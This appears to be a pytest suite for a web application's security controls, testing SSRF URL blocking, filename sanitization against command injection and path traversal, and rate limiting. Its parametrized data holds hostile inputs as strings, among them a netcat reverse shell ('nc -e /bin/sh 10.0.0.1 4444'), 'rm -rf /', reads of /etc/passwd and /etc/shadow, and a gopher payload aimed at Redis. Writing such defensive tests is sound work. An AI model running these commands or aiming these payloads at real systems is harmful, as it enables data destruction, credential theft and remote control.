import pytest
from httpx import ASGITransport, AsyncClient

from app.core.errors import RateLimitExceededError, SSRFValidationError
from app.core.rate_limit import SlidingWindowRateLimiter
from app.main import app
from app.security.sanitization import sanitize_filename
from app.security.ssrf import validate_url_ssrf

# =========================================================================
# 1. SSRF ADVERSARIAL ATTACK TEST SUITE
# =========================================================================

@pytest.mark.parametrize(
    "attack_url",
    [
        # IPv4 Loopbacks
        "http://127.0.0.1",
        "http://127.0.0.1:8000/secret",
        "http://127.0.1.1:8080/admin",
        "http://localhost:3000",
        "http://localhost:8000",
        # Cloud Instance Metadata Endpoints (AWS / GCP / Azure / OpenStack)
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://instance-data/latest/meta-data/",
        # RFC 1918 Private Subnets
        "http://10.0.0.1/",
        "http://10.254.12.3:8080/internal",
        "http://172.16.0.1/",
        "http://172.20.10.2:9000/",
        "http://172.31.255.255/",
        "http://192.168.0.1/",
        "http://192.168.1.1/admin.html",
        "http://192.168.100.254/",
        # Current Network / Broadcast / Reserved
        "http://0.0.0.0/",
        "http://255.255.255.255/",
        "http://224.0.0.1/",
        # Container Internal Hostnames
        "http://host.docker.internal:8000/",
        "http://docker.for.win.localhost/",
        "http://kubernetes.default.svc.cluster.local/",
        # IPv6 Loopback & Private
        "http://[::1]/",
        "http://[::1]:8000/admin",
        "http://[fe80::1]/",
        "http://[fc00::1]/",
    ],
)
def test_ssrf_blocks_internal_and_cloud_endpoints(attack_url: str):
    with pytest.raises(SSRFValidationError):
        validate_url_ssrf(attack_url)


@pytest.mark.parametrize(
    "scheme_url",
    [
        "file:///etc/shadow",
        "file:///C:/Windows/win.ini",
        "ftp://anonymous@ftp.example.com/payload.sh",
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",
        "dict://127.0.0.1:11211/stat",
        "data:text/html,<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "ldap://127.0.0.1:389/c=US",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
)
def test_ssrf_blocks_non_http_schemes(scheme_url: str):
    with pytest.raises(SSRFValidationError):
        validate_url_ssrf(scheme_url)


# =========================================================================
# 2. COMMAND INJECTION & SHELL ESCAPE DEFENSE
# =========================================================================

def test_sanitization_escapes_command_injection_payloads():
    payloads = [
        ("; rm -rf /", "rm_-rf"),
        ("`whoami`.mp4", "whoami_.mp4"),
        ("$(cat /etc/passwd).mp4", "_cat_etc_passwd_.mp4"),
        ("& calc.exe &", "calc.exe"),
        ("| nc -e /bin/sh 10.0.0.1 4444 |", "nc_-e_bin_sh_10.0.0.1_4444"),
        ("video; shutdown /s /t 0", "video_shutdown_s_t_0"),
    ]

    for dirty, expected_clean in payloads:
        clean = sanitize_filename(dirty)
        assert ";" not in clean
        assert "`" not in clean
        assert "$" not in clean
        assert "|" not in clean
        assert "&" not in clean


# =========================================================================
# 3. PATH TRAVERSAL & ARBITRARY FILE OVERWRITE DEFENSE
# =========================================================================

@pytest.mark.parametrize(
    "traversal_input, expected_sanitized",
    [
        ("../../../../etc/passwd", "etc_passwd"),
        ("..\\..\\..\\Windows\\System32\\cmd.exe", "Windows_System32_cmd.exe"),
        ("/var/log/syslog", "var_log_syslog"),
        ("C:\\boot.ini", "C_boot.ini"),
        ("....//....//secret.key", "secret.key"),
        ("CON.mp4", "file_CON.mp4"),
        ("NUL.zip", "file_NUL.zip"),
        ("PRN.txt", "file_PRN.txt"),
        ("AUX.wav", "file_AUX.wav"),
        ("COM1.mp3", "file_COM1.mp3"),
        ("LPT1.m4a", "file_LPT1.m4a"),
        ("null\x00byte.mp4", "null_byte.mp4"),
        ("control\x1fcharacter.jpg", "control_character.jpg"),
    ],
)
def test_path_traversal_and_reserved_names(traversal_input: str, expected_sanitized: str):
    sanitized = sanitize_filename(traversal_input)
    assert sanitized == expected_sanitized
    assert "/" not in sanitized
    assert "\\" not in sanitized
    assert "\x00" not in sanitized


def test_sanitize_filename_max_length_bound():
    long_title = "A" * 500 + ".mp4"
    sanitized = sanitize_filename(long_title)
    assert len(sanitized.encode("utf-8")) <= 200


# =========================================================================
# 4. RATE LIMITING STRESS TEST
# =========================================================================

def test_sliding_window_rate_limiter_stress():
    limiter = SlidingWindowRateLimiter()
    ip = "192.0.2.1"  # TEST-NET-1 client
    max_reqs = 5

    # First 5 requests must pass
    for _ in range(max_reqs):
        limiter.check(f"test:{ip}", max_requests=max_reqs, window_seconds=60)

    # 6th request must trigger RateLimitExceededError
    with pytest.raises(RateLimitExceededError):
        limiter.check(f"test:{ip}", max_requests=max_reqs, window_seconds=60)


@pytest.mark.asyncio
async def test_api_ssrf_rejection_http_contract():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Attack payload on /api/extract
        res = await client.post(
            "/api/extract",
            json={"url": "http://169.254.169.254/latest/meta-data/"},
        )
        assert res.status_code == 403
        data = res.json()
        assert data["success"] is False
        assert data["error_code"] == "SSRF_BLOCKED"
